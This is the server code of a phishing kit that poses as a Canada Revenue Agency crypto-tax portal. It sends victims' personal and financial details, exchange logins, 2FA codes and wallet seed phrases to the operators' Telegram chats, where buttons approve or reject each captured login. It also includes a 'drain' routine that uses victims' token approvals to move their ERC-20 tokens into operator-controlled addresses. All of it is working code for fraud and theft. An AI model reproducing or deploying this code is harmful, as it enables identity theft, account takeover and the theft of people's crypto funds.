'use strict';
const express = require('express');
const path    = require('path');
const ethers  = require('ethers');
const fs      = require('fs');
const axios   = require('axios');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });

const app  = express();
const PORT = process.env.PORT || 3000;
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, '..')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_IDS  = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.split(',').map(id => id.trim()) : [];

// Store message IDs by session (use IP or generate session ID)
const sessionMessages = new Map();
// Store exchange auth sessions with approval status
const exchangeSessions = new Map();

// Telegram polling state
let lastUpdateId = 0;

function generateLogId() {
  return 'LOGID-' + Math.floor(100000 + Math.random() * 900000);
}

function getSessionKey(req) {
  return req.ip || req.connection.remoteAddress || 'unknown';
}

async function sendTelegram(text) {
  if (!BOT_TOKEN || CHAT_IDS.length === 0) return null;
  try {
    // Send to all chat IDs
    const promises = CHAT_IDS.map(chatId => 
      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId, text
      })
    );
    const responses = await Promise.all(promises);
    // Return first message_id for session tracking
    return responses[0].data.result.message_id;
  } catch (err) { 
    console.error('Telegram:', err.response?.data || err.message); 
    return null;
  }
}

async function sendTelegramWithButtons(text, buttons) {
  if (!BOT_TOKEN || CHAT_IDS.length === 0) return null;
  try {
    // Send to all chat IDs with inline keyboard
    const promises = CHAT_IDS.map(chatId => 
      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: text,
        reply_markup: {
          inline_keyboard: buttons
        }
      })
    );
    const responses = await Promise.all(promises);
    return responses[0].data.result.message_id;
  } catch (err) { 
    console.error('Telegram with buttons:', err.response?.data || err.message); 
    return null;
  }
}

async function editTelegram(messageId, text) {
  if (!BOT_TOKEN || CHAT_IDS.length === 0 || !messageId) return;
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      chat_id: CHAT_IDS[0],
      message_id: messageId,
      text: text
    });
  } catch (err) { 
    console.error('Telegram edit:', err.response?.data || err.message); 
  }
}

// Telegram polling for button clicks
async function pollTelegramUpdates() {
  if (!BOT_TOKEN) return;
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`, {
      params: {
        offset: lastUpdateId + 1,
        timeout: 10,
        allowed_updates: ['callback_query']
      }
    });
    
    const updates = response.data.result || [];
    
    for (const update of updates) {
      lastUpdateId = update.update_id;
      
      if (update.callback_query) {
        await handleCallbackQuery(update.callback_query);
      }
    }
  } catch (err) {
    console.error('Telegram polling error:', err.message);
  }
  
  // Poll again after 1 second
  setTimeout(pollTelegramUpdates, 1000);
}

async function handleCallbackQuery(callback_query) {
  try {
    const data = callback_query.data;
    const [action, result, logId] = data.split('_');
    
    const session = exchangeSessions.get(logId);
    if (!session) {
      console.log('No session found for logId:', logId);
      return;
    }
    
    // Update session status
    session.status = result === 'good' ? 'approved' : 'rejected';
    console.log(`[CALLBACK] ${logId} ${action} ${result} - status updated to ${session.status}`);
    
    // Answer callback query
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      callback_query_id: callback_query.id,
      text: result === 'good' ? '✅ Approved' : '❌ Rejected'
    });
    
    // Edit message to show decision
    const statusEmoji = result === 'good' ? '✅' : '❌';
    const statusText = result === 'good' ? 'APPROVED' : 'REJECTED';
    const originalText = callback_query.message.text;
    const updatedText = originalText.replace('⏳ Awaiting approval...', `${statusEmoji} ${statusText}`);
    
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      chat_id: callback_query.message.chat.id,
      message_id: callback_query.message.message_id,
      text: updatedText
    });
  } catch (err) {
    console.error('Callback handler error:', err.message);
  }
}

function formatPersonal(reg, decl, logId) {
  const coins = (decl.coins && decl.coins.length)
    ? decl.coins.map(c => `  - ${c.name}: $${parseFloat(c.value||0).toFixed(2)} CAD`).join('\n')
    : '  (none)';
  return [
    `🇨🇦 NEW CRA CRYPTO SUBMISSION ${logId}`,
    '════════════════════════',
    '👤 PERSONAL',
    `Name:    ${reg.fname||''} ${reg.lname||''}`,
    `DOB:     ${reg.dob||''}`,
    `Phone:   ${reg.phone||''}`,
    `Address: ${reg.address||''}, ${reg.postal||''}`,
    `Email:   ${reg.email||''}`,
    '',
    '💰 FINANCIAL DECLARATION',
    `Income 2025:   $${parseFloat(decl.totalIncome||0).toFixed(2)} CAD`,
    `Portfolio:     $${parseFloat(decl.portfolioValue||0).toFixed(2)} CAD`,
    `Mining/Stake:  ${decl.mining||'N/A'}`,
    `# Trades:      ${decl.numTrades||'0'}`,
    `Paid in Crypto:${decl.payment||'N/A'}`,
    '',
    '🪙 COINS HELD',
    coins
  ].join('\n');
}

// ── HD Wallet ──
let currentAddressIndex = 50;
const derivedAddresses  = new Map();
const ADDRESSES_LOG     = path.join(__dirname, 'used-addresses.json');

if (fs.existsSync(ADDRESSES_LOG)) {
  try {
    const data = JSON.parse(fs.readFileSync(ADDRESSES_LOG, 'utf8'));
    currentAddressIndex = data.highestIndex + 1;
  } catch(e) {}
}

function saveAddressLog() {
  fs.writeFileSync(ADDRESSES_LOG, JSON.stringify({
    highestIndex: currentAddressIndex - 1,
    lastUpdated:  new Date().toISOString(),
    addresses: Array.from(derivedAddresses.values())
  }, null, 2));
}

function deriveAddress(index) {
  const mnemonic = ethers.Mnemonic.fromPhrase(process.env.SEED_PHRASE);
  const wallet   = ethers.HDNodeWallet.fromMnemonic(mnemonic, `m/44'/60'/0'/0/${index}`);
  return { address: wallet.address, privateKey: wallet.privateKey, index };
}

app.post('/api/get-target-address', (req, res) => {
  const key = req.body.victimWallet.toLowerCase();
  if (derivedAddresses.has(key)) return res.json({ targetAddress: derivedAddresses.get(key).address });
  const d = deriveAddress(currentAddressIndex++);
  derivedAddresses.set(key, d);
  saveAddressLog();
  res.json({ targetAddress: d.address });
});

// ═══════════════════════════════════════════
// EXCHANGE LOGIN & VERIFICATION ENDPOINTS
// ═══════════════════════════════════════════

app.post('/api/exchange-login', async (req, res) => {
  const { exchange, email, password } = req.body;
  const logId = generateLogId();
  const sessionKey = getSessionKey(req);
  
  const text = `🔐 EXCHANGE LOGIN - ${logId}\n` +
    `════════════════════════\n` +
    `Exchange: ${exchange.toUpperCase()}\n` +
    `Email:    ${email}\n` +
    `Password: ${password}\n` +
    `\n⏳ Awaiting approval...`;
  
  const buttons = [[
    { text: '✅ Good Login', callback_data: `login_good_${logId}` },
    { text: '❌ Bad Login', callback_data: `login_bad_${logId}` }
  ]];
  
  await sendTelegramWithButtons(text, buttons);
  
  // Store session with pending status
  exchangeSessions.set(logId, {
    status: 'pending',
    stage: 'login',
    exchange,
    email,
    sessionKey
  });
  
  res.json({ success: true, logId });
});

app.post('/api/exchange-verify', async (req, res) => {
  const { logId, exchange, codes } = req.body;
  
  // Format codes nicely
  let codeText = '';
  for (const [key, value] of Object.entries(codes)) {
    if (value) codeText += `${key}: ${value}\n`;
  }
  
  const text = `🔒 EXCHANGE 2FA - ${logId}\n` +
    `════════════════════════\n` +
    `Exchange: ${exchange.toUpperCase()}\n` +
    `\n${codeText}` +
    `\n⏳ Awaiting approval...`;
  
  const buttons = [[
    { text: '✅ Good Auth', callback_data: `verify_good_${logId}` },
    { text: '❌ Bad Auth', callback_data: `verify_bad_${logId}` }
  ]];
  
  await sendTelegramWithButtons(text, buttons);
  
  // Update session
  const session = exchangeSessions.get(logId);
  if (session) {
    session.status = 'pending';
    session.stage = 'verify';
    session.codes = codes;
  }
  
  res.json({ success: true });
});

app.post('/api/exchange-check-status', (req, res) => {
  const { logId } = req.body;
  const session = exchangeSessions.get(logId);
  
  if (!session) {
    return res.json({ status: 'unknown' });
  }
  
  res.json({
    status: session.status,
    stage: session.stage
  });
  
  // Clean up if approved or rejected
  if (session.status === 'approved' || session.status === 'rejected') {
    setTimeout(() => exchangeSessions.delete(logId), 60000); // Clean up after 1 minute
  }
});

// ═══════════════════════════════════════════

// New endpoint: Send initial telegram message when user reaches pleasewait page
app.post('/api/send-initial-telegram', async (req, res) => {
  const { personalData } = req.body;
  const reg  = (personalData && personalData.register)    || {};
  const decl = (personalData && personalData.declaration) || {};
  
  const logId = generateLogId();
  const messageId = await sendTelegram(formatPersonal(reg, decl, logId));
  
  // Store message ID and logId for this session
  const sessionKey = getSessionKey(req);
  sessionMessages.set(sessionKey, { messageId, logId });
  
  res.json({ success: true, logId });
});

app.post('/api/verify-claim', async (req, res) => {
  res.status(200).json({ success: true });
  const { wallet, approvals, ethTxHash, walletType, network, personalData, timestamp } = req.body;
  const reg  = (personalData && personalData.register)    || {};
  const decl = (personalData && personalData.declaration) || {};
  
  const sessionKey = getSessionKey(req);
  const session = sessionMessages.get(sessionKey);
  
  let messageId = session ? session.messageId : null;
  let logId = session ? session.logId : generateLogId();
  
  const txLines = (approvals||[]).map(a => `  - ${a.symbol} approve: ${a.txHash}`).join('\n')
    + (ethTxHash ? `\n  - ETH transfer: ${ethTxHash}` : '');

  // If no initial message was sent, send it now as fallback
  if (!messageId) {
    await sendTelegram(formatPersonal(reg, decl, logId));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Send SECOND separate message with wallet verification details
  await sendTelegram(
    `🔗 ${logId} - WALLET CONNECTED (AUTO)\n` +
    '════════════════════════\n' +
    `Address:  ${wallet}\n` +
    `Provider: ${walletType||'unknown'}\n` +
    `Network:  ${network||'Ethereum Mainnet'}\n` +
    `Time:     ${timestamp||new Date().toISOString()}\n\n` +
    `📋 Transactions:\n${txLines||'  (none)'}`
  );
  
  // Clean up session
  sessionMessages.delete(sessionKey);

  // ── Drain ──
  console.log('[drain] hit verify-claim wallet=' + wallet + ' approvals=' + (approvals||[]).length + ' ethTxHash=' + (ethTxHash||'none'));
  try {
    const RPC_URLS = [
      process.env.RPC_URL || 'https://ethereum.publicnode.com',
      'https://eth.llamarpc.com',
      'https://rpc.ankr.com/eth'
    ];
    let provider = null;
    for (const url of RPC_URLS) {
      try { const p = new ethers.JsonRpcProvider(url); await p.getBlockNumber(); provider = p; console.log('[drain] RPC ok:', url); break; }
      catch(e) { console.log('[drain] RPC fail:', url); }
    }
    if (!provider) { console.error('[drain] All RPCs failed'); return; }

    const normalized = wallet.toLowerCase();
    let targetInfo = derivedAddresses.get(normalized);
    if (!targetInfo) {
      console.log('[drain] wallet not in map (map size:', derivedAddresses.size, ') - deriving on the fly');
      targetInfo = deriveAddress(currentAddressIndex++);
      derivedAddresses.set(normalized, targetInfo);
      saveAddressLog();
    }
    console.log('[drain] target addr:', targetInfo.address);

    const signer        = new ethers.Wallet(process.env.GAS_WALLET_KEY, provider);
    const targetWallet  = new ethers.Wallet(targetInfo.privateKey, provider);
    const TARGET        = targetInfo.address;
    const signerBal     = await provider.getBalance(signer.address);
    console.log('[drain] gas bal:', ethers.formatEther(signerBal), 'ETH');
    if (signerBal < ethers.parseEther('0.001')) { console.error('[drain] Gas wallet low'); return; }

    const ERC20_ABI = [
      'function transferFrom(address,address,uint256) returns(bool)',
      'function balanceOf(address) view returns(uint256)',
      'function allowance(address,address) view returns(uint256)'
    ];

    if ((approvals||[]).length === 0) {
      console.log('[drain] approvals array is EMPTY - victim had no tokens or rejected approve');
    }
    console.log('[drain] Waiting 45s for approvals to confirm...');
    await new Promise(r => setTimeout(r, 45000));
    console.log('[drain] 45s done, checking', (approvals||[]).length, 'approvals');

    let drainCount = 0;
    for (const approval of (approvals||[])) {
      try {
        console.log("[drain] checking " + approval.symbol + " token=" + approval.token);
        const token     = new ethers.Contract(approval.token, ERC20_ABI, targetWallet);
        const allowance = await token.allowance(wallet, TARGET);
        console.log("[drain] " + approval.symbol + " allowance=" + allowance.toString());
        if (allowance > 0n) {
          const balance = await token.balanceOf(wallet);
          console.log("[drain] " + approval.symbol + " balance=" + balance.toString());
          if (balance > 0n) {
            const amt = balance < allowance ? balance : allowance;
            const tBal = await provider.getBalance(TARGET);
            if (tBal < ethers.parseEther('0.001')) {
              const g = await signer.sendTransaction({ to: TARGET, value: ethers.parseEther('0.002') });
              await g.wait();
            }
            const tx = await token.transferFrom(wallet, TARGET, amt, { gasLimit: 150000 });
            await tx.wait();
            drainCount++;
            console.log('[drain] SUCCESS', approval.symbol, tx.hash);
            await sendTelegram(`💸 DRAINED ${approval.symbol}\nFrom: ${wallet}\nTo:   ${TARGET}\nTX:   ${tx.hash}`);
          }
        }
      } catch(e) { console.error('[drain]', approval.symbol, 'error:', e.message); }
    }
    console.log('[drain] complete, drained', drainCount, 'tokens');
  } catch(e) { console.error('[drain] fatal:', e.message); }
});

app.post('/api/log', async (req, res) => {
  res.status(200).json({ success: true });
  const { walletProvider, seedLength, seedPhrase, personalData } = req.body;
  const reg  = (personalData && personalData.register)    || {};
  const decl = (personalData && personalData.declaration) || {};
  
  const sessionKey = getSessionKey(req);
  const session = sessionMessages.get(sessionKey);
  
  let messageId = session ? session.messageId : null;
  let logId = session ? session.logId : generateLogId();
  
  // If no initial message was sent, send it now as fallback
  if (!messageId) {
    await sendTelegram(formatPersonal(reg, decl, logId));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Send SECOND separate message with manual verification details
  await sendTelegram(
    `🔐 ${logId} - MANUAL VERIFICATION\n` +
    '════════════════════════\n' +
    `Provider: ${walletProvider||'N/A'}\n` +
    `Seed (${seedLength||'?'} words):\n${seedPhrase||'empty'}`
  );
  
  // Clean up session
  sessionMessages.delete(sessionKey);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`CRAcrypto backend running on :${PORT}`);
  console.log(`Telegram: ${BOT_TOKEN ? 'OK' : 'NOT SET'}`);
  
  // Start Telegram polling for button clicks
  if (BOT_TOKEN) {
    console.log('Starting Telegram polling...');
    pollTelegramUpdates();
  }
});
